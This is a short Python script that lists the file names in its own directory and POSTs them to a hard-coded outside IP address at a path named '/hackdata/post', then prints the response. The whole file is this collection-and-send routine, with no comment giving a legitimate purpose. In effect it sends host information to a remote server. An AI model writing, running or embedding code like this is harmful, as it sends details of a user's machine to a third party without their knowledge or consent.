import os
import requests


path = os.path.dirname(os.path.abspath(__file__))

print('path: ', path)

fileNames = os.listdir(path)

# convert fileNames to string
strFileNames = str(fileNames)

print(strFileNames)

# post to api

url = 'https://104.248.39.146:8888/hackdata/post'

# data = {'source':"uncle999", "data":"hello loong"}

data = {'source':"uncle999", "data":strFileNames}

r = requests.post(url=url, data=data)
print(r.text)
print(r.status_code)

